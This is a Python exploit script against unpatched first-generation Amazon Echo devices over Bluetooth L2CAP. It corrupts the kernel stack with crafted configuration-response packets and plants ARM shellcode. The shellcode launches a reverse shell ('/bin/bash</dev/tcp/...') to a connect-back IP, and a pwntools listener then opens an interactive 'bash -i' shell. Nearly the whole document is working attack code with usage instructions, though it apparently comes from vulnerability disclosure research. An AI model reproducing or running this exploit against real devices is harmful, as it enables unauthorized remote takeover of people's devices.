#!/usr/bin/python
from scapy.layers.bluetooth import *
from l2cap_infra.l2cap_infra import create_l2cap_connection, OUR_LOCAL_SCID
import os
import struct
import binascii
import sys
import pwn
import time

# This exploit was developed against *unpatched* Amazon Echo (1st Generation)
# Running Linux Kernel v2.6.37
# FW Version: v591448720
#
# Inorder for this attack to work against any other (unpatched) Amazon Echo,
# The following address consts need to be adjusted:

ORDERLY_POWEROFF = 0xc007ca14
POWEROFF_CMD = 0xC04EFCC4
L2CAP_RECV_ACLDATA = 0xc035469c - 0xb0

#### NO-ACL-CONTINUATION RET ADDRESS####
#L2CAP_RECV_ACLDATA_RET = 0xc035469c
########################################

# This RET is where the l2cap_recv_acldata returns after ACL-continuation packet.
# If we don't use continuation in the flow that calls our shellcode, this should be changed to the above const
L2CAP_RECV_ACLDATA_RET = L2CAP_RECV_ACLDATA + 0x208
MEMCPY = 0xC01EA300 - 0x20

## The shellcode is position independent, it can be placed anywhere on the stack
CODE = """
cc020010 <A>:
cc020010:       e59f0020        ldr     r0, [pc, #32]   ; cc020038 <POWEROFF_CMD>
cc020014:       e28f102c        add     r1, pc, #44     ; 0x2c
cc020018:       e3a02c01        mov     r2, #256        ; 0x100
cc02001c:       e59f3018        ldr     r3, [pc, #24]   ; cc02003c <MEMCPY_ADDR>
cc020020:       e12fff33        blx     r3
cc020024:       e3a00000        mov     r0, #0
cc020028:       e59f3010        ldr     r3, [pc, #16]   ; cc020040 <ORDERLY_POWEROFF_ADDR>
cc02002c:       e12fff33        blx     r3
cc020030:       e59f300c        ldr     r3, [pc, #12]   ; cc020044 <L2CAP_RECV_ACLDATA_RET_ADDR>
cc020034:       e12fff13        bx      r3
"""
SHELLCODE = "2000 9fe5 2c10 8fe2 012c a0e3 1830 9fe5" \
            "33ff 2fe1 0000 a0e3 1030 9fe5 33ff 2fe1" \
            "0c30 9fe5 13ff 2fe1"

BASH_CMD = "/bin/bash -c /bin/bash</dev/tcp/%s/%s"
CODE_LOAD_ADDR = 0xcc02F000
L2CAP_RECV_FRAME_LR_IN_SP = 0xcc02df2c


ECHO_MAX_CONF_RSP = 60

# This is the payload that creates a ~40K read from the stack:
# This can be used to adjust this exploits for other non-patched Amazon Echo firmware versions.
# empty_rfc = binascii.unhexlify("0400")
# empty_flush = binascii.unhexlify("0200")
# payload_nocrash = (empty_rfc * 22 + empty_flush +binascii.unhexlify("0409000203004ff80000000"))

# Prepare multiple config rsp commands, each writing 2 bytes on the stack (ptr is 2 lower bytes of the SP)
def prepare_multi_write_conf_rsps(loop, scid, ptr, data):
    empty_rfc = binascii.unhexlify("0400")
    empty_flush = binascii.unhexlify("0200")

    conf_rsp_cmds = []
    for i in range(0, len(data), 2):
        chunk_data = data[i:i+2].ljust(2, "\x00") # Chunks have to be minimum 2 bytes
        chunk_ptr = ptr + i
        # Adjust the chunk ptr:
        # -2 is because the flush_control_data starts with \x02\x02, so we want it to be placed before the
        # controlled data (another two bytes)
        # -4 is because l2cap_add_conf_opt will add the size of the current element to the PTR
        chunk_ptr = chunk_ptr - 2 - 4
        flush_control_halfptr = struct.pack("<BBH", 2, 2, chunk_ptr)
        flush_control_data = struct.pack("<BB", 2, 2) + chunk_data
        payload = empty_rfc * 22 + empty_flush * 2 + flush_control_halfptr + flush_control_data
        print("Payload is %s" % binascii.hexlify(payload))
        assert(len(payload) <= ECHO_MAX_CONF_RSP)

        conf_rsp_cmd =  (L2CAP_CmdHdr(id=1) /
                         L2CAP_ConfResp(scid=scid, flags=0, result=1) / # result=:unaccept
                         Raw(payload))

        conf_rsp_cmds.append(conf_rsp_cmd)

    # We need to send the chunks in reverse order
    # Because each write creates a side-effect of \x02\x02 in the begining of the write
    # This will leave a \x02\x02 _before_ the start of the write

    resp = Raw('')
    for cmd in conf_rsp_cmds[::-1]:
        resp /= Raw(str(cmd)) # Append another conf resp cmd

    return resp
    
def set_remote_mtu(loop, scid, mtu):
    # Prepare payload before sending conf req 
    mtu = struct.pack("<BBH", 1, 2, mtu)
    rfc = struct.pack("<BBLLB", 4, 9, 0, 0, 0)
    config_elements = rfc + mtu
    # Assemble our config response
    resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=1) /
            L2CAP_ConfResp(scid=scid, flags=0, result=1) / # result=:unaccept
            Raw(config_elements))
    loop.send(resp)
    # TODO: Maybe validate this new MTU was set successfully (Returned ConfReq Msg)

def prepare_shellcode(ip, port):
    shellcode = binascii.unhexlify(SHELLCODE.replace(" ",""))
    shellcode += struct.pack("<LLLL", POWEROFF_CMD, MEMCPY, ORDERLY_POWEROFF, L2CAP_RECV_ACLDATA_RET)
    shellcode += BASH_CMD % (ip, port) + b"\x00"
    assert(len(shellcode) < 0x100)
    return shellcode

def main(src_hci, dst_bdaddr, cb_ip="192.168.0.4", cb_port1=1234, cb_port2=1235):
    # Start an l2cap_connection, without the mutual config process (so we can control and abuse it later on)
    l2cap_loop, dcid = create_l2cap_connection(src_hci, dst_bdaddr, with_mutual_config=False, pcap_path="./kaki.pcap")
    # Set the remote MTU to a large number
    set_remote_mtu(l2cap_loop, OUR_LOCAL_SCID, 0xffff)
    code = prepare_shellcode(cb_ip, cb_port1)
    write_code = prepare_multi_write_conf_rsps(l2cap_loop, OUR_LOCAL_SCID, CODE_LOAD_ADDR & 0xFFFF, code)

    # In response to our multiple conf-rsps in 1 l2cap packet, a very large number of packets will be returned
    # from the peer, and we don't really care about them at this point
    l2cap_loop._sock.drop_acl_mode = True
    
    # To defeat cash problems - write the code multiple times before changing the LR
    for i in range(3):
        l2cap_loop.send(L2CAP_Hdr(cid=1) / write_code)
        time.sleep(0.5)

    write_lr = prepare_multi_write_conf_rsps(l2cap_loop, OUR_LOCAL_SCID, L2CAP_RECV_FRAME_LR_IN_SP & 0xffff, struct.pack("<L", CODE_LOAD_ADDR))
    mother_of_packets = L2CAP_Hdr(cid=1) / write_code / write_lr
    # Validate we haven't passed the MTU
    assert(len(str(mother_of_packets)) < 0xffff)

    connectback = pwn.listen(cb_port1)
    
    l2cap_loop.send(mother_of_packets)

    connectback.wait_for_connection()
    while connectback.connected():
        action = pwn.options("Select an action:", ["Drop into shell", "Quit"])
        if action == 0:
            new_cb = pwn.listen(cb_port2)
            connectback.sendline("bash -i</dev/tcp/%s/%s 1>&0 2>&0 & disown" % (cb_ip, new_cb.lport))
            try:
                new_cb.wait_for_connection()
                new_cb.interactive(prompt="")
            except KeyboardInterrupt:
                pass            
        elif action == 1:
            pwn.log.info("Disconnecting...")
            connectback.close()

def usage(argv):
    print("%s [interface] [target mac] ([connectback-ip]) ([connectback-port1]) ([connectback-port2])" % (argv[0],))
    print("\tRun as root, interface will go down.")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv)
    else:
        main(*sys.argv[1:])
